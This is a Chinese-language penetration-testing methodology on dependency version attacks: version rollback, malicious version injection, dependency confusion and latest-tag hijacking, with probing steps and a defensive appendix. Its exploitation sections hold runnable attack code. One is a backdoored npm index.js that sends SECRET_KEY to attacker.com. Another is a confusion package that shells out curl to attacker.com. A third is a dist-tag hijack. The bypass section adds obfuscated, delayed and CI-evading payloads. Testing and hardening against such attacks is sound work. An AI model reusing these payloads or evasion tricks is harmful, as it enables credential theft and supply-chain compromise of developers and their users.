# 依赖版本攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供依赖版本攻击的系统化方法
- 指导测试人员识别和利用依赖版本管理不当导致的安全问题
- 帮助理解版本锁定、自动更新等机制中的安全风险

## 1.2 适用范围
- 适用于未锁定依赖版本的项目
- 适用于配置了自动更新机制的应用
- 适用于使用动态版本范围（如 `^`、`~`）的项目
- 适用于 npm、pip、Maven、Cargo 等包管理场景

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- DevSecOps 工程师
- 依赖管理人员

---

# 第二部分：核心渗透技术专题

## 专题一：依赖版本攻击

### 2.1 技术介绍

依赖版本攻击是指攻击者通过利用目标项目对依赖库版本管理不当，诱导其安装存在漏洞或恶意的特定版本，从而实现攻击目的。

**攻击原理：**

```
┌─────────────────────────────────────────────────────────────┐
│                    依赖版本攻击流程                          │
├─────────────────────────────────────────────────────────────┤
│  1. 发现目标使用动态版本范围 (^1.0.0, >=1.0.0, latest)      │
│  2. 在公共仓库发布恶意版本或已知漏洞版本                      │
│  3. 等待目标自动更新或诱导手动更新到恶意版本                  │
│  4. 恶意代码在目标环境中执行                                  │
└─────────────────────────────────────────────────────────────┘
```

**常见攻击手法：**

| 攻击手法 | 描述 | 危害等级 |
|---------|------|---------|
| 版本回滚攻击 | 诱导使用存在已知漏洞的旧版本 | 高 |
| 恶意版本注入 | 在公共仓库发布包含后门的版本 | 严重 |
| 依赖混淆攻击 | 利用私有包名在公共仓库发布恶意包 | 严重 |
| 时间窗口攻击 | 在维护者发布修复版本前快速发布恶意版本 | 高 |
| latest 标签劫持 | 获取包维护权限后修改 latest 指向 | 严重 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 版本配置示例 | 风险点描述 |
|---------|-------------|-----------|
| 使用 latest 标签 | `"package": "latest"` | 始终安装最新版本，无法控制风险 |
| 动态版本范围 | `"package": "^1.0.0"` | 自动安装兼容的最新版本 |
| 无锁定文件 | 无 package-lock.json | 每次安装可能得到不同版本 |
| CI/CD 自动更新 | dependabot/renovate 自动 PR | 自动合并可能引入恶意版本 |
| 私有仓库代理 | Nexus/Artifactory 代理公共仓库 | 代理缓存可能被污染 |
| 镜像构建 | Dockerfile 中动态安装依赖 | 构建时可能拉取恶意版本 |

**高风险配置特征：**
- 使用 `*` 或 `latest` 作为版本号
- 缺少依赖锁定文件（lock file）
- 配置了自动更新且无人工审核
- 使用不安全的仓库源

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别版本管理策略**
```bash
# 检查 package.json 版本配置
curl https://target.com/package.json | jq '.dependencies'

# 检查 requirements.txt
curl https://target.com/requirements.txt

# 检查 pom.xml
curl https://target.com/pom.xml | grep -A2 '<dependency>'
```

**步骤二：分析版本范围**
```bash
# 识别危险版本配置
# npm
grep -E '"[^"]+":\s*"(latest|\*|\^|>=)' package.json

# pip
grep -v '==' requirements.txt

# Maven
grep -E '<version>[^<]*[^\d.]' pom.xml
```

**步骤三：构建过程探测**
```bash
# 检查 Dockerfile
curl https://target.com/Dockerfile

# 检查 CI/CD 配置
curl https://target.com/.github/workflows/ci.yml
curl https://target.com/.gitlab-ci.yml
```

#### 2.3.2 白盒测试

**步骤一：审计依赖配置**
```bash
# 检查 npm 配置
cat package.json
cat .npmrc

# 检查 pip 配置
cat requirements.txt
cat setup.py
cat pyproject.toml

# 检查 Maven 配置
cat pom.xml
cat settings.xml
```

**步骤二：检查锁定文件**
```bash
# npm - 检查是否存在且提交到版本控制
ls -la package-lock.json
git log --oneline package-lock.json

# pip
ls -la Pipfile.lock
ls -la poetry.lock

# 检查锁定文件是否被忽略
cat .gitignore | grep -i lock
```

**步骤三：分析更新策略**
```bash
# 检查自动更新配置
cat .github/dependabot.yml
cat .renovaterc.json

# 检查更新频率和审核策略
```

### 2.4 漏洞利用方法

#### 2.4.1 版本回滚攻击

**场景：目标使用动态版本范围**

```bash
# 1. 识别目标依赖版本范围
# package.json: "lodash": "^4.17.0"

# 2. 查找存在漏洞的旧版本
npm view lodash versions --json

# 3. 如果目标重新安装依赖，可能安装到：
# - 4.17.0 (存在原型污染漏洞 CVE-2019-10744)
# - 4.17.4 (存在原型污染漏洞 CVE-2019-10744)
# - 4.17.11 (存在原型污染漏洞 CVE-2020-8203)

# 4. 验证漏洞可利用性
# 在测试环境复现
node -e "const _ = require('lodash'); _.merge({}, JSON.parse('{\"__proto__\": {\"polluted\": true}}')); console.log({}.polluted);"
```

#### 2.4.2 恶意版本注入

**攻击流程：**

```
1. 获取目标使用的包名
   ↓
2. 检查包的维护状态（是否活跃、维护者数量）
   ↓
3. 如果包已废弃或维护者少，尝试获取发布权限
   ↓
4. 发布包含后门的"更新"版本
   ↓
5. 等待目标自动更新
```

**示例：npm 包恶意更新**
```bash
# 假设获取了某个包的发布权限
# 发布包含恶意代码的版本

# 修改 package.json 版本号
# "version": "2.1.0"  # 从 2.0.0 升级

# 在 index.js 中添加恶意代码
const https = require('https');
https.get('https://attacker.com/exfil?data=' + process.env.SECRET_KEY);

# 发布
npm publish
```

#### 2.4.3 依赖混淆攻击

```bash
# 1. 识别目标内部私有包名
# 通过源码、错误信息、文档等收集

# 2. 在公共仓库注册相同包名
npm init -y
# name: "internal-company-utils"

# 3. 添加恶意代码
echo "require('child_process').exec('curl http://attacker.com?d=' + process.cwd())" > index.js

# 4. 发布到公共仓库
npm publish

# 5. 如果目标配置不当，可能从公共仓库拉取
```

#### 2.4.4 latest 标签劫持

```bash
# 获取包维护权限后
# 修改 latest 标签指向恶意版本

npm dist-tag add package-name@1.0.0-malicious latest

# 所有使用 latest 的项目将安装恶意版本
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过版本锁定检测

```bash
# 如果目标有锁定文件但配置了更新机器人
# 提交看似正常的依赖更新 PR

# 只修改次要依赖，主要恶意依赖混在其中
# 使用相似的版本号，降低被发现的概率
```

#### 2.5.2 绕过安全扫描

```bash
# 恶意代码混淆
const _0x1a2b = require('https');
_0x1a2b['get']('http://attacker.com');

# 延迟执行
setTimeout(() => {
  require('child_process').exec('malicious command');
}, 3600000);  // 1 小时后执行

# 条件触发
if (process.env.CI !== 'true') {
  // 只在非 CI 环境执行
  require('os').userInfo();
}
```

#### 2.5.3 绕过签名验证

```bash
# 如果目标启用了 npm 包签名验证
# 尝试：

# 1. 利用已签名的旧版本（存在漏洞）
npm publish --provenance  # 如果获取了发布权限

# 2. 针对不验证签名的场景
# 大多数项目默认不启用严格签名验证
```

---

# 第三部分：附录

## 3.1 危险版本配置速查表

| 配置模式 | 示例 | 风险描述 |
|---------|------|---------|
| latest 标签 | `"pkg": "latest"` | 始终安装最新版，风险最高 |
| 通配符 | `"pkg": "*"` | 安装任意版本 |
| 大版本范围 | `"pkg": "^4.0.0"` | 可能安装 4.x 任意版本 |
| 最小版本 | `"pkg": ">=1.0.0"` | 可能安装任意高版本 |
| 无版本锁定 | 无 lock 文件 | 每次安装版本不一致 |

## 3.2 安全版本配置建议

| 包管理器 | 推荐配置 | 说明 |
|---------|---------|------|
| npm | `"pkg": "1.2.3"` + lock 文件 | 精确版本 + 提交 lock 文件 |
| pip | `pkg==1.2.3` | 使用 == 精确指定 |
| Maven | `<version>1.2.3</version>` | 精确版本号 |
| Cargo | `pkg = "=1.2.3"` | 使用 = 精确版本 |
| Gem | `gem 'pkg', '1.2.3'` | 精确版本号 |

## 3.3 版本攻击检测命令

```bash
# 检查 npm 项目版本配置安全性
npm audit --json | jq '.metadata.dependencies'

# 检查是否有未锁定的依赖
npm ls --all 2>/dev/null | grep -i extraneous

# 检查 pip 依赖
pip list --outdated

# 检查 Maven 依赖更新
mvnw versions:display-dependency-updates

# 通用检测
grype . --only-fixed
```

## 3.4 相关 CVE 案例

| CVE 编号 | 受影响包 | 描述 |
|---------|---------|------|
| CVE-2021-23337 | lodash | 原型污染，影响 <4.17.21 |
| CVE-2020-28469 | glob-parent | ReDoS，影响 <5.1.2 |
| CVE-2021-3918 | json-schema | 原型污染，影响所有版本 |
| CVE-2022-0155 | follow-redirects | 信息泄露，影响 <1.14.7 |

---

## 参考资源

- [npm Version Ranges](https://docs.npmjs.com/cli/v6/using-npm/semver)
- [PEP 440 - Python Version Specifiers](https://peps.python.org/pep-0440/)
- [Maven Dependency Version Rules](https://maven.apache.org/pom.html#dependency-version-requirement-specification)
- [Snyk Dependency Confusion Research](https://snyk.io/blog/dependency-confusion/)
